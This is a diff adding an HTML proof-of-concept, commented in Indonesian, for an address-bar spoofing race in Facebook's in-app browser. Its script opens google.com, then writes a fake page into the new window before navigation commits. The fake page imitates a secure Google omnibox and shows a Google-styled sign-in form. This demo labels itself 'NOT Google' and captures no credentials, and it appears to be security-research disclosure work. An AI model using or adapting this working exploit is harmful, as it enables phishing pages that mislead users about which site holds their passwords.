@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>FB IAB Address-Bar Spoof – Race</title>
+<style>
+  body{margin:0;font-family:system-ui,Roboto,Arial,sans-serif;display:grid;place-items:center;min-height:100vh}
+  button{font-size:18px;padding:14px 18px;border:0;border-radius:12px;box-shadow:0 4px 14px rgba(0,0,0,.12);cursor:pointer}
+</style>
+</head>
+<body>
+<button id="go">Open PoC</button>
+
+<script>
+const TARGET = "https://www.google.com/";       // domain yang ingin “terlihat”
+const FIRST_DELAY = 35;                          // 25–80ms: naikin jika sering kalah race
+const MAX_RETRY = 8;
+
+function fakeHTML() {
+  return `<!doctype html><html lang="en"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Google</title>
+  <style>
+    *{box-sizing:border-box}html,body{margin:0;background:#fff;color:#202124}
+    #bar{position:sticky;top:0;height:56px;display:flex;align-items:center;gap:10px;padding:0 12px;background:#fff;box-shadow:0 1px 3px rgba(0,0,0,.12);z-index:9999}
+    #omnibox{flex:1;background:#f1f3f4;border:1px solid rgba(0,0,0,.06);border-radius:24px;padding:8px 16px;font-size:14px;text-align:center;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    #lock{width:12px;height:12px;background:#0f9d58;border-radius:2px;display:inline-block;margin-right:6px}
+    .content{text-align:center;padding:24px 16px;min-height:1800px}
+    .card{width:100%;max-width:330px;margin:18px auto 0;padding:20px;border:1px solid rgba(0,0,0,.08);border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.08)}
+    .in{width:100%;padding:10px 12px;margin:8px 0 12px;border:1px solid #dadce0;border-radius:8px}
+    .btn{width:100%;padding:10px 14px;border:0;border-radius:8px;background:#4285F4;color:#fff}
+    .logo{width:160px;margin-top:20px}
+    .sp{margin-top:480px}
+  </style></head><body>
+  <div id="bar" aria-hidden="true">
+    <div id="omnibox"><span id="lock"></span> ${TARGET.replace(/\/$/,'')}</div>
+  </div>
+  <div class="content">
+    <img class="logo" alt="Google Logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png">
+    <h1>This is <u>NOT</u> Google!</h1>
+    <p>Demo for address bar spoofing PoC (no credentials captured).</p>
+    <form class="card" onsubmit="event.preventDefault();alert('Demo only.');">
+      <label>Username</label><input class="in" type="text" placeholder="Username" autocomplete="off">
+      <label>Password</label><input class="in" type="password" placeholder="Password" autocomplete="off">
+      <button class="btn" type="submit">Sign In</button>
+    </form>
+    <div class="sp"><p>Scroll down to see more…</p></div>
+  </div>
+  <script>
+    // Nudge agar URL bar mobile collapse
+    let t=0; function n(){try{scrollTo(0,1)}catch(e){} if(++t<8) requestAnimationFrame(n)}
+    addEventListener('load',()=>setTimeout(n,220));
+  </script>
+</body></html>`;
+}
+
+function openRace() {
+  // harus dari user gesture
+  const w = window.open(TARGET, "_blank", "noopener");
+  if (!w) { alert("Popup diblokir FB in-app. Izinkan popup lalu coba lagi."); return; }
+
+  const payload = fakeHTML();
+  let tries = 0;
+
+  const attempt = () => {
+    tries++;
+    try {
+      // Selama belum cross-origin commit, write akan sukses
+      w.document.open("text/html", "replace");
+      w.document.write(payload);
+      w.document.close();
+    } catch (e) {
+      // Sudah navigasi ke cross-origin — race kalah, berhenti
+      return;
+    }
+    if (tries < MAX_RETRY) setTimeout(attempt, 16); // beberapa kali utk nutup race layout
+  };
+
+  setTimeout(attempt, FIRST_DELAY);
+}
+
+document.getElementById('go').addEventListener('click', openRace, {passive:true});
+</script>
+</body>
+</html>
